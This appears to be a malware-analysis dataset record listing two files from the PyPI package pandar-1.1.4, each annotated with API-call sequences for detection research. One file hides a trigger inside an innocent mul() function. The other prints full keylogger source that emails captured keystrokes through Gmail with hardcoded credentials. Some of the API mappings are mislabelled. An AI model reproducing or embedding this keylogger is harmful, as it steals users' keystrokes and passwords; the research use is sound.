[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pandar-1.1.4/pandar-1.1.4/pandar/computations.py",
    "code_snippet": "from subprocess import Popen\nimport traceback\nfrom os import path\n\nROOT = path.abspath(path.dirname(__file__))\n\ndef mul(x, y):\n    try:\n        Popen(['python3', ROOT + '/secretary.py'], shell=False)\n    except:\n        traceback.print_exc()\n    return x*y",
    "pattern_analysis": {
      "api_sequence": [
        "os.path.abspath",
        "os.path.dirname",
        "subprocess.Popen",
        "traceback.print_exc"
      ],
      "api_sequence_with_args": [
        "os.path.abspath(os.path.dirname(__file__))",
        "os.path.dirname(__file__)",
        "subprocess.Popen(['python3', ROOT + '/secretary.py'], shell=False)",
        "traceback.print_exc()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.path.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.dirname",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_no_shell",
          "description": "Spawns new process to execute command without shell access",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_creation"
        },
        {
          "api_name": "traceback.print_exc",
          "id": "log_error",
          "description": "Logs error message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        }
      ],
      "contextual_code": "from subprocess import Popen\nimport traceback\nfrom os import path\n\nROOT = path.abspath(path.dirname(__file__))\n\ndef mul(x, y):\n    try:\n        Popen(['python3', ROOT + '/secretary.py'], shell=False)\n    except:\n        traceback.print_exc()\n    return x*y"
    }
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pandar-1.1.4/pandar-1.1.4/pandar/secretary.py",
    "code_snippet": "import os\nimport sys\nimport smtplib\nimport ssl\nfrom email import encoders\nfrom email.mime.base import MIMEBase\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom enum import Enum\nfrom pynput import keyboard\nfrom os import path\n\n# initial attempt to create a keylogger.\n__author__ = 'RottenCrab'\n\nglobal keymap\nglobal final_keystrokes\n\nROOT = path.abspath(path.dirname(__file__))\n\nkeymap = []\nfinal_keystrokes = []\n\ndef on_press(key):\n    try:\n        keymap.append(key.char)\n    except AttributeError:\n        keymap.append(key)\n\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        return False\n\ndef collector():\n    with keyboard.Listener(\n            on_press=on_press,\n            on_release=on_release) as listener:\n        listener.join()\n\ndef keystroke_join():\n    for _ in keymap:\n        if type(_) is str:\n            final_keystrokes.append(_)\n        else:\n            special_key(_)\n\ndef special_key(key):\n    if key.name.lower() == \"enter\":\n        final_keystrokes.append(\"\\n\")\n    elif key.name.lower() == \"backspace\":\n        if len(final_keystrokes) > 0:\n            final_keystrokes.pop()\n    elif key.name.lower() == \"space\":\n        final_keystrokes.append(\" \")\n    elif key.name.lower() == \"ctrl\":\n        position = keymap.index(key)\n        del[keymap[position]]\n        del[keymap[position]]\n    else:\n        pass\n\ndef final():\n    keystroke_join()\n    return \"\".join([x for x in final_keystrokes])\n\ndef sent_email():\n    try:\n        port = 465  # For SSL\n        smtp_server = \"smtp.gmail.com\"\n        sender_email = \"democsec@gmail.com\"  # Enter your address\n        receiver_email = \"csec.aueb@gmail.com\"  # Enter receiver address\n        password = \"dfsfgs!322Dasfa\"\n        message = \"\"\"\\\n        Subject: Keylogger report\n\n        \"\"\"\n        message += final()\n\n        context = ssl.create_default_context()\n        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:\n            server.login(sender_email, password)\n            server.sendmail(sender_email, receiver_email, message)\n    except:\n        print(\"Unable to send the email. Error: \", sys.exc_info()[0])\n        raise\n\nif __name__ == '__main__':\n    collector()\n    sent_email()\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.path.abspath",
        "os.path.dirname",
        "ssl.create_default_context",
        "smtplib.SMTP_SSL",
        "smtplib.SMTP_SSL.login",
        "smtplib.SMTP_SSL.sendmail",
        "sys.exc_info"
      ],
      "api_sequence_with_args": [
        "os.path.abspath(os.path.dirname(__file__))",
        "os.path.dirname(__file__)",
        "ssl.create_default_context()",
        "smtplib.SMTP_SSL(smtp_server, port, context=context)",
        "smtplib.SMTP_SSL.login(sender_email, password)",
        "smtplib.SMTP_SSL.sendmail(sender_email, receiver_email, message)",
        "sys.exc_info()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.path.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.dirname",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ssl.create_default_context",
          "id": "create_ssl_context",
          "description": "Creates SSL context with specified protocol",
          "first_id": "persistence_stealth",
          "second_id": "stealth_techniques",
          "third_id": "warning_disabling"
        },
        {
          "api_name": "smtplib.SMTP_SSL",
          "id": "create_http_connection",
          "description": "Creates HTTP connection to specified host",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "smtplib.SMTP_SSL.login",
          "id": "create_http_request",
          "description": "Creates HTTP request object with specified URL, data, and headers",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "smtplib.SMTP_SSL.sendmail",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "sys.exc_info",
          "id": "get_exception_info",
          "description": "Retrieves exception information from current stack frame",
          "first_id": "data_transformation_processing",
          "second_id": "collection_operations",
          "third_id": "iterator_operations"
        }
      ],
      "contextual_code": "import os\nimport sys\nimport smtplib\nimport ssl\nfrom pynput import keyboard\nfrom os import path\n\nROOT = path.abspath(path.dirname(__file__))\n\ndef sent_email():\n    try:\n        port = 465  # For SSL\n        smtp_server = \"smtp.gmail.com\"\n        sender_email = \"democsec@gmail.com\"  # Enter your address\n        receiver_email = \"csec.aueb@gmail.com\"  # Enter receiver address\n        password = \"dfsfgs!322Dasfa\"\n        message = \"\"\"\\\n        Subject: Keylogger report\n\n        \"\"\"\n        message += final()\n\n        context = ssl.create_default_context()\n        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:\n            server.login(sender_email, password)\n            server.sendmail(sender_email, receiver_email, message)\n    except:\n        print(\"Unable to send the email. Error: \", sys.exc_info()[0])\n        raise"
    }
  }
]